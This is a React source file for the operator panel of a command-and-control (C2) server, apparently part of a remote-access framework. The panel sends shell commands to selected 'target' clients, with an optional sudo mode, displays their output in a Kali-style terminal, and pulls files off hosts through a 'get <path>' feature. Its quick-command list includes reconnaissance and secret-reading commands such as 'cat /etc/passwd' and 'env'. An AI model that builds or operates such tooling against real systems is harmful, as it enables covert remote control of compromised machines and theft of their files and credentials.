'use client';

import { useState, useRef, useEffect } from 'react';
import {
  ChevronDown, Loader2, RotateCcw, ShieldAlert, Terminal,
  KeyRound, Eye, EyeOff, Trash2, Download, FolderOpen,
} from 'lucide-react';
import * as Select from '@radix-ui/react-select';
import { useToast } from '@/context/ToastContext';
import { useClients, useCommandHistory } from '@/hooks/useApi';
import { api } from '@/lib/api';
import { cn } from '@/lib/utils';
import type { Command } from '@/types';

const QUICK_COMMANDS = [
  'whoami', 'id', 'hostname', 'uname -a',
  'ip a', 'netstat -tulnp', 'ps aux',
  'ls -la', 'cat /etc/passwd', 'env', 'pwd', 'cat /etc/os-release',
];

/* ─── Status colour helper ──────────────────────────────────────── */
function statusColor(s: string) {
  switch (s?.toLowerCase()) {
    case 'done':    return '#5af78e';  // bright green
    case 'error':   return '#ff5c57';  // bright red
    case 'running': return '#57c7ff';  // bright blue
    default:        return '#f3f99d';  // yellow (pending)
  }
}

function statusLabel(s: string) {
  switch (s?.toLowerCase()) {
    case 'done':    return '✓';
    case 'error':   return '✗';
    case 'running': return '●';
    default:        return '…';
  }
}

/* ─── Single terminal block ─────────────────────────────────────── */
function TerminalEntry({
  cmd, serverUser, serverHostname,
}: {
  cmd: Command;
  serverUser: string;
  serverHostname: string;
}) {
  const ts = cmd.created_at
    ? new Date(cmd.created_at).toLocaleTimeString('en-GB', { hour12: false })
    : '--:--:--';

  const isServer  = cmd.client_id === '[C2-Server]';
  const entryUser = isServer ? serverUser : cmd.client_id.slice(0, 12);
  const entryHost = isServer ? serverHostname : String(cmd.client_id).slice(0, 20);
  const entryRoot = entryUser === 'root';
  const pathColor = '#f3f99d';
  const cwdDisplay = cmd.cwd ?? (isServer ? '~' : '~');
  const col    = statusColor(cmd.status);
  const promptChar = entryRoot ? '#' : '$';
  const promptColor = entryRoot ? '#ff5c57' : '#5af78e';

  return (
    <div className="px-3 py-1 select-text">
      {/* prompt line */}
      <div className="font-mono text-[13px] leading-snug flex flex-wrap items-center gap-1">
        <span style={{ color: '#ff5c57' }}>┌──(</span>
        <span style={{ color: entryRoot ? '#ff5c57' : '#5af78e' }}>{entryUser}</span>
        <span style={{ color: '#ff5c57' }}>㉿</span>
        <span style={{ color: '#57c7ff' }}>{entryHost}</span>
        <span style={{ color: '#ff5c57' }}>)-[</span>
        <span style={{ color: pathColor }}>{cwdDisplay}</span>
        <span style={{ color: '#ff5c57' }}>]</span>
        <span className="ml-auto text-[11px]" style={{ color: '#636363' }}>{ts}</span>
      </div>
      {/* Command line */}
      <div className="font-mono text-[13px] leading-snug flex items-start gap-1.5">
        <span style={{ color: '#ff5c57' }}>└─</span>
        <span style={{ color: promptColor }}>{promptChar}</span>
        <span className="text-white flex-1 break-all">{cmd.command}</span>
        <span className="text-[11px] font-bold ml-1" style={{ color: col }}>
          {statusLabel(cmd.status)}
        </span>
      </div>
      {/* Output */}
      <div className="font-mono text-[12px] leading-relaxed pl-5 mt-0.5">
        {cmd.result ? (
          <pre className="whitespace-pre-wrap break-all" style={{ color: col }}>
            {cmd.result}
          </pre>
        ) : (
          <span style={{ color: col, fontStyle: 'italic' }}>
            {cmd.status === 'pending'  && 'waiting for agent…'}
            {cmd.status === 'running'  && 'executing…'}
            {cmd.status === 'done'     && '(no output)'}
            {cmd.status === 'error'    && '(no details)'}
          </span>
        )}
      </div>
    </div>
  );
}

/* ─── Main Component ────────────────────────────────────────────── */
export function CommandCenter() {
  const toast   = useToast();
  const { data: clientsMap, isLoading: clientsLoading } = useClients();
  const { data: commandHistory, isLoading: historyLoading, mutate: refreshHistory } =
    useCommandHistory();

  const [selectedClient, setSelectedClient] = useState('');
  const [command, setCommand]               = useState('');
  const [sending, setSending]               = useState(false);
  const [sudoMode, setSudoMode]             = useState(false);

  // Real server shell state
  const [serverUser, setServerUser]         = useState('user');
  const [serverHostname, setServerHostname] = useState('c2');
  const [serverCwd, setServerCwd]           = useState('~');
  const [isRoot, setIsRoot]                 = useState(false);

  // Get file panel
  const [getFilePath, setGetFilePath]       = useState('');
  const [downloading, setDownloading]       = useState(false);

  // Sudo password config panel
  const [showSudoPanel, setShowSudoPanel]   = useState(false);
  const [sudoPassword, setSudoPassword]     = useState('');
  const [showSudoPass, setShowSudoPass]     = useState(false);
  const [savingSudo, setSavingSudo]         = useState(false);
  const [hasSudoPassword, setHasSudoPassword] = useState(false);

  const terminalRef = useRef<HTMLDivElement>(null);
  const inputRef    = useRef<HTMLInputElement>(null);

  const clientIds  = clientsMap ? Object.keys(clientsMap) : [];

  useEffect(() => {
    const el = terminalRef.current;
    if (el) el.scrollTop = el.scrollHeight;
  }, [commandHistory]);

  // Load server info + sudo password status on mount
  useEffect(() => {
    api.getServerInfo().then(info => {
      setServerUser(info.user);
      setServerHostname(info.hostname);
      setServerCwd(info.cwd);
      setIsRoot(info.is_root);
    }).catch(() => {});
    api.getServerConfig().then(cfg => setHasSudoPassword(cfg.has_sudo_password)).catch(() => {});
  }, []);

  const handleSaveSudoPassword = async () => {
    if (!sudoPassword.trim()) { toast.warning('Enter a sudo password'); return; }
    try {
      setSavingSudo(true);
      await api.updateServerConfig({ sudo_password: sudoPassword.trim() });
      setHasSudoPassword(true);
      setSudoPassword('');
      toast.success('Sudo password saved — sudo mode ready', 'Saved ✓');
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Unknown error';
      toast.error(`Failed to save — ${msg}`, 'Error');
    } finally {
      setSavingSudo(false);
    }
  };

  const handleClearSudoPassword = async () => {
    try {
      await api.deleteServerConfig();
      setHasSudoPassword(false);
      toast.success('Sudo password cleared', 'Cleared');
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Unknown error';
      toast.error(`Failed — ${msg}`, 'Error');
    }
  };

  const handleDownload = async (path: string) => {
    const trimmed = path.trim();
    if (!trimmed) { toast.warning('Enter a file path'); return; }
    try {
      setDownloading(true);
      const blob = await api.downloadFile(trimmed);
      const filename = trimmed.split('/').pop() || 'file';
      const url = URL.createObjectURL(blob);
      const a   = document.createElement('a');
      a.href     = url;
      a.download = filename;
      a.click();
      URL.revokeObjectURL(url);
      toast.success(`Downloaded: ${filename}`, 'Done ✓');
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Unknown error';
      toast.error(`Download failed — ${msg}`, 'Error');
    } finally {
      setDownloading(false);
    }
  };

  const handleSend = async () => {
    if (!command.trim()) { toast.warning('Please enter a command'); return; }
    if (!selectedClient)  { toast.warning('Please select a target client'); return; }

    // Intercept `get <path>` when targeting [C2-Server] → trigger download
    const getMatch = command.trim().match(/^get\s+(.+)$/i);
    if (getMatch && selectedClient === '[C2-Server]') {
      setCommand('');
      await handleDownload(getMatch[1]);
      return;
    }

    try {
      setSending(true);
      const res = await api.sendCommand({
        command: command.trim(),
        client_id: selectedClient,
        sudo: sudoMode,
      }) as { status?: string; command_id?: number; result?: string; cwd?: string; user?: string; download_path?: string };

      // Update shell state if [C2-Server] responded
      if (res.cwd)  setServerCwd(res.cwd);
      if (res.user) { setServerUser(res.user); setIsRoot(res.user === 'root'); }

      // If server says there's a file to download, trigger it
      if (res.download_path) {
        await handleDownload(res.download_path);
      } else if (res.result !== undefined) {
        toast.success(`Executed on ${selectedClient}`, 'Done ✓');
      } else {
        toast.success(`Queued for ${selectedClient}`, 'Queued ✓');
      }
      setCommand('');
      await refreshHistory();
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Unknown error';
      toast.error(`Failed to send — ${msg}`, 'Error');
    } finally {
      setSending(false);
      inputRef.current?.focus();
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); handleSend(); }
  };

  /* ── Terminal window colours ── */
  const termBg      = '#0d0e13';
  const titleBarBg  = '#1a1b26';
  const menuBarBg   = '#161722';

  return (
    <div className="flex flex-col gap-4">

      {/* ── Terminal window ── */}
      <div
        className="rounded-xl overflow-hidden shadow-2xl border border-white/[0.07]"
        style={{ background: termBg, fontFamily: "'JetBrains Mono', 'Fira Code', monospace" }}
      >
        {/* ── Window title bar ── */}
        <div
          className="flex items-center justify-between px-3 py-2"
          style={{ background: titleBarBg, borderBottom: '1px solid rgba(255,255,255,0.06)' }}
        >
          {/* Left: traffic lights */}
          <div className="flex items-center gap-1.5">
            <span className="w-3 h-3 rounded-full" style={{ background: '#ff5c57' }} />
            <span className="w-3 h-3 rounded-full" style={{ background: '#ffbd2e' }} />
            <span className="w-3 h-3 rounded-full" style={{ background: '#28ca41' }} />
          </div>
          {/* Center: title */}
          <span className="text-xs font-mono" style={{ color: '#c0c0c0' }}>
            <span style={{ color: isRoot ? '#ff5c57' : '#5af78e' }}>{serverUser}</span>
            <span style={{ color: '#636363' }}>@</span>
            <span style={{ color: '#57c7ff' }}>{serverHostname}</span>
            <span style={{ color: '#636363' }}>: </span>
            <span style={{ color: '#f3f99d' }}>{serverCwd}</span>
            {sudoMode && (
              <span className="ml-2 px-1.5 py-0.5 rounded text-[10px] font-bold"
                style={{ background: 'rgba(255,92,87,0.25)', color: '#ff5c57' }}>
                SUDO
              </span>
            )}
          </span>
          {/* Right: refresh */}
          <button
            onClick={() => refreshHistory()}
            className="transition-colors"
            style={{ color: '#636363' }}
            onMouseEnter={e => (e.currentTarget.style.color = '#c0c0c0')}
            onMouseLeave={e => (e.currentTarget.style.color = '#636363')}
            title="Refresh"
          >
            <RotateCcw size={12} />
          </button>
        </div>

        {/* ── Menu bar ── */}
        <div
          className="flex items-center justify-between px-3 py-1"
          style={{ background: menuBarBg, borderBottom: '1px solid rgba(255,255,255,0.04)' }}
        >
          {/* Menu items */}
          <div className="flex items-center gap-4">
            {['Session', 'Actions', 'Edit', 'View', 'Help'].map(item => (
              <span key={item} className="text-xs cursor-default select-none"
                style={{ color: '#c0c0c0' }}>
                {item}
              </span>
            ))}
          </div>
          {/* Client selector in menu bar */}
          <div className="flex items-center gap-2">
            <span className="text-xs" style={{ color: '#636363' }}>target:</span>
            <Select.Root value={selectedClient} onValueChange={setSelectedClient}>
              <Select.Trigger
                className="flex items-center gap-1.5 px-2 py-0.5 rounded text-xs font-mono outline-none transition-colors"
                style={{
                  background: 'rgba(255,255,255,0.05)',
                  border: '1px solid rgba(255,255,255,0.1)',
                  color: selectedClient ? '#5af78e' : '#636363',
                  minWidth: '120px',
                }}
              >
                <Select.Value placeholder={
                  clientsLoading ? 'loading…' : 'select target…'
                } />
                <Select.Icon className="ml-auto">
                  <ChevronDown size={10} style={{ color: '#636363' }} />
                </Select.Icon>
              </Select.Trigger>
              <Select.Portal>
                <Select.Content
                  className="rounded-lg shadow-2xl overflow-hidden z-50"
                  style={{
                    background: '#1a1b26',
                    border: '1px solid rgba(255,255,255,0.1)',
                    minWidth: '180px',
                  }}
                  position="popper"
                  sideOffset={4}
                >
                  <Select.Viewport className="p-1">
                    {clientIds.map(id => (
                      <Select.Item
                        key={id} value={id}
                        className="flex items-center px-3 py-1.5 text-xs rounded cursor-pointer outline-none font-mono"
                        style={{ color: '#c0c0c0' }}
                      >
                        <Select.ItemText>{id}</Select.ItemText>
                      </Select.Item>
                    ))}
                    {clientIds.length === 0 && !clientsLoading && (
                      <div className="px-3 py-2 text-xs text-center" style={{ color: '#636363' }}>
                        No clients connected
                      </div>
                    )}
                  </Select.Viewport>
                </Select.Content>
              </Select.Portal>
            </Select.Root>
          </div>
        </div>

        {/* ── Terminal output area ── */}
        <div
          ref={terminalRef}
          className="overflow-y-auto overflow-x-hidden py-2"
          style={{ height: '420px', background: termBg }}
          onClick={() => inputRef.current?.focus()}
        >
          {historyLoading ? (
            <div className="flex items-center justify-center h-full gap-2"
              style={{ color: '#636363', fontFamily: 'monospace' }}>
              <Loader2 size={14} className="animate-spin" />
              <span className="text-sm">Loading history…</span>
            </div>
          ) : commandHistory.length === 0 ? (
            <div className="flex flex-col items-center justify-center h-full gap-3"
              style={{ color: '#636363' }}>
              <Terminal size={28} />
              <p className="text-xs font-mono">No commands yet.</p>
            </div>
          ) : (
            <div className="space-y-3 pb-2">
              {[...commandHistory].reverse().map(cmd => (
                <TerminalEntry
                  key={cmd.id}
                  cmd={cmd}
                  serverUser={serverUser}
                  serverHostname={serverHostname}
                />
              ))}
            </div>
          )}
        </div>

        {/* ── Input area ── */}
        <div
          className="px-3 py-2"
          style={{ background: termBg, borderTop: '1px solid rgba(255,255,255,0.05)' }}
        >
          {/* Prompt first line — use actual server info when [C2-Server] is selected */}
          {(() => {
            const isC2 = selectedClient === '[C2-Server]';
            const displayUser = isC2 ? serverUser : (selectedClient ? selectedClient.slice(0, 12) : 'user');
            const displayHost = isC2 ? serverHostname : (selectedClient || 'no-target');
            const displayCwd  = isC2 ? serverCwd : '~';
            const effectiveRoot = isC2 ? isRoot : false;
            const promptChar  = (sudoMode || effectiveRoot) ? '#' : '$';
            const promptColor = (sudoMode || effectiveRoot) ? '#ff5c57' : '#5af78e';
            const userColor   = effectiveRoot ? '#ff5c57' : '#5af78e';
            return (
              <>
                <div className="font-mono text-[13px] leading-snug mb-0.5 flex flex-wrap items-center gap-1">
                  <span style={{ color: '#ff5c57' }}>┌──(</span>
                  <span style={{ color: userColor }}>{displayUser}</span>
                  <span style={{ color: '#ff5c57' }}>㉿</span>
                  <span style={{ color: '#57c7ff' }}>{displayHost}</span>
                  <span style={{ color: '#ff5c57' }}>)-[</span>
                  <span style={{ color: '#f3f99d' }}>{displayCwd}</span>
                  <span style={{ color: '#ff5c57' }}>]</span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="font-mono text-[13px] flex-shrink-0" style={{ color: '#ff5c57' }}>└─</span>
                  <span className="font-mono text-[13px] flex-shrink-0" style={{ color: promptColor }}>
                    {promptChar}
                  </span>
                  <input
                    ref={inputRef}
                    type="text"
                    value={command}
                    onChange={e => setCommand(e.target.value)}
                    onKeyDown={handleKeyDown}
                    placeholder={selectedClient ? '' : 'select a target first…'}
                    disabled={!selectedClient}
                  className="flex-1 bg-transparent outline-none font-mono text-[13px] disabled:opacity-40 disabled:cursor-not-allowed"
                  style={{ color: '#ffffff', caretColor: '#5af78e' }}
                />

                {/* sudo toggle */}
                <button
                  onClick={() => setSudoMode(v => !v)}
                  title={sudoMode ? 'SUDO ON — click to disable' : 'SUDO OFF — click to enable'}
                  className="flex items-center gap-1 px-2 py-1 rounded text-xs font-mono font-bold flex-shrink-0 transition-all"
                  style={{
                    background: sudoMode ? 'rgba(255,92,87,0.2)' : 'rgba(255,255,255,0.05)',
                    border: `1px solid ${sudoMode ? 'rgba(255,92,87,0.5)' : 'rgba(255,255,255,0.1)'}`,
                    color: sudoMode ? '#ff5c57' : '#636363',
                  }}
                >
                  <ShieldAlert size={11} />
                  sudo
                </button>

                {/* send button */}
                <button
                  onClick={handleSend}
                  disabled={sending || !command.trim() || !selectedClient}
                  className="flex items-center gap-1.5 px-3 py-1 rounded text-xs font-mono font-bold flex-shrink-0 transition-all disabled:opacity-40 disabled:cursor-not-allowed"
                  style={{
                    background: sudoMode ? 'rgba(255,92,87,0.2)' : 'rgba(90,247,142,0.15)',
                    border: `1px solid ${sudoMode ? 'rgba(255,92,87,0.4)' : 'rgba(90,247,142,0.3)'}`,
                    color: sudoMode ? '#ff5c57' : '#5af78e',
                  }}
                >
                  {sending
                    ? <><Loader2 size={11} className="animate-spin" />running</>
                    : <>↵ run</>}
                </button>
              </div>
            </>
          );
          })()}
        </div>
      </div>

      {/* ── Quick commands ── */}
      <div
        className="rounded-xl px-4 py-3 border border-white/[0.06]"
        style={{ background: menuBarBg }}
      >
        <div className="flex flex-wrap gap-2 items-center">
          <span className="text-xs font-mono mr-1" style={{ color: '#636363' }}>quick:</span>
          {QUICK_COMMANDS.map(cmd => (
            <button
              key={cmd}
              onClick={() => { setCommand(cmd); inputRef.current?.focus(); }}
              className="px-2 py-0.5 rounded text-xs font-mono transition-all"
              style={{
                background: command === cmd ? 'rgba(90,247,142,0.15)' : 'rgba(255,255,255,0.04)',
                border: `1px solid ${command === cmd ? 'rgba(90,247,142,0.4)' : 'rgba(255,255,255,0.08)'}`,
                color: command === cmd ? '#5af78e' : '#9a9aaa',
              }}
            >
              {cmd}
            </button>
          ))}
        </div>
      </div>

      {/* ── Get File ── */}
      <div
        className="rounded-xl border border-white/[0.06] overflow-hidden"
        style={{ background: titleBarBg }}
      >
        <div className="flex items-center gap-3 px-4 py-3">
          <div className="w-7 h-7 rounded-lg flex items-center justify-center flex-shrink-0"
            style={{ background: 'rgba(87,199,255,0.15)' }}>
            <Download size={13} style={{ color: '#57c7ff' }} />
          </div>
          <div className="flex-1 min-w-0">
            <p className="text-xs font-mono font-semibold" style={{ color: '#c0c0c0' }}>
              Get File
              <span className="ml-2 text-[10px] font-normal" style={{ color: '#636363' }}>
                type <code style={{ color: '#57c7ff' }}>get &lt;path&gt;</code> in the terminal OR use the box below
              </span>
            </p>
          </div>
        </div>
        <div className="px-4 pb-4 flex gap-2"
          style={{ borderTop: '1px solid rgba(255,255,255,0.04)' }}>
          <div className="relative flex-1">
            <FolderOpen size={13} className="absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none"
              style={{ color: '#636363' }} />
            <input
              type="text"
              value={getFilePath}
              onChange={e => setGetFilePath(e.target.value)}
              onKeyDown={e => e.key === 'Enter' && handleDownload(getFilePath)}
              placeholder="/home/user/secret.txt  or  ~/file.log"
              className="w-full bg-white/[0.04] border border-white/[0.08] rounded-xl pl-8 pr-3 py-2 text-sm font-mono outline-none transition-all duration-200"
              style={{ color: '#c0c0c0' }}
            />
          </div>
          <button
            onClick={() => handleDownload(getFilePath)}
            disabled={downloading || !getFilePath.trim()}
            className="flex items-center gap-1.5 px-4 py-2 rounded-xl text-xs font-mono font-bold transition-all disabled:opacity-40 flex-shrink-0"
            style={{
              background: 'rgba(87,199,255,0.15)',
              border: '1px solid rgba(87,199,255,0.3)',
              color: '#57c7ff',
            }}
          >
            {downloading
              ? <><Loader2 size={12} className="animate-spin" />Downloading…</>
              : <><Download size={12} />Download</>}
          </button>
        </div>
      </div>

      {/* ── Sudo Password Settings ── */}
      <div
        className="rounded-xl border border-white/[0.06] overflow-hidden"
        style={{ background: titleBarBg }}
      >
        {/* Header / toggle */}
        <button
          onClick={() => setShowSudoPanel(v => !v)}
          className="w-full flex items-center justify-between px-4 py-3 transition-colors hover:bg-white/[0.03]"
        >
          <div className="flex items-center gap-2">
            <KeyRound size={14} style={{ color: '#ff5c57' }} />
            <span className="text-xs font-mono font-semibold" style={{ color: '#c0c0c0' }}>
              Sudo Password
            </span>
            {hasSudoPassword ? (
              <span className="px-1.5 py-0.5 rounded text-[10px] font-bold font-mono"
                style={{ background: 'rgba(90,247,142,0.15)', color: '#5af78e', border: '1px solid rgba(90,247,142,0.3)' }}>
                SET
              </span>
            ) : (
              <span className="px-1.5 py-0.5 rounded text-[10px] font-bold font-mono"
                style={{ background: 'rgba(255,92,87,0.15)', color: '#ff5c57', border: '1px solid rgba(255,92,87,0.3)' }}>
                NOT SET
              </span>
            )}
          </div>
          <ChevronDown
            size={14}
            style={{ color: '#636363', transform: showSudoPanel ? 'rotate(180deg)' : 'none', transition: 'transform 0.2s' }}
          />
        </button>

        {showSudoPanel && (
          <div className="px-4 pb-4 flex flex-col gap-3"
            style={{ borderTop: '1px solid rgba(255,255,255,0.04)' }}>
            <p className="text-xs pt-3" style={{ color: '#636363' }}>
              Required for sudo mode on [C2-Server]. Stored securely on the server.
            </p>
            <div className="flex gap-2">
              <div className="relative flex-1">
                <input
                  type={showSudoPass ? 'text' : 'password'}
                  value={sudoPassword}
                  onChange={e => setSudoPassword(e.target.value)}
                  onKeyDown={e => e.key === 'Enter' && handleSaveSudoPassword()}
                  placeholder={hasSudoPassword ? 'Enter new password to update…' : 'Enter sudo password…'}
                  className="w-full bg-white/[0.04] border border-white/[0.08] rounded-lg px-3 py-2 text-sm font-mono outline-none pr-8"
                  style={{ color: '#c0c0c0' }}
                />
                <button
                  onClick={() => setShowSudoPass(v => !v)}
                  className="absolute right-2 top-1/2 -translate-y-1/2 transition-colors"
                  style={{ color: '#636363' }}
                  onMouseEnter={e => (e.currentTarget.style.color = '#c0c0c0')}
                  onMouseLeave={e => (e.currentTarget.style.color = '#636363')}
                >
                  {showSudoPass ? <EyeOff size={14} /> : <Eye size={14} />}
                </button>
              </div>
              <button
                onClick={handleSaveSudoPassword}
                disabled={savingSudo || !sudoPassword.trim()}
                className="px-3 py-2 rounded-lg text-xs font-mono font-bold transition-all disabled:opacity-40"
                style={{ background: 'rgba(90,247,142,0.15)', border: '1px solid rgba(90,247,142,0.3)', color: '#5af78e' }}
              >
                {savingSudo ? <Loader2 size={12} className="animate-spin" /> : 'Save'}
              </button>
              {hasSudoPassword && (
                <button
                  onClick={handleClearSudoPassword}
                  className="px-3 py-2 rounded-lg text-xs font-mono font-bold transition-all"
                  style={{ background: 'rgba(255,92,87,0.1)', border: '1px solid rgba(255,92,87,0.25)', color: '#ff5c57' }}
                  title="Clear saved sudo password"
                >
                  <Trash2 size={12} />
                </button>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default CommandCenter;
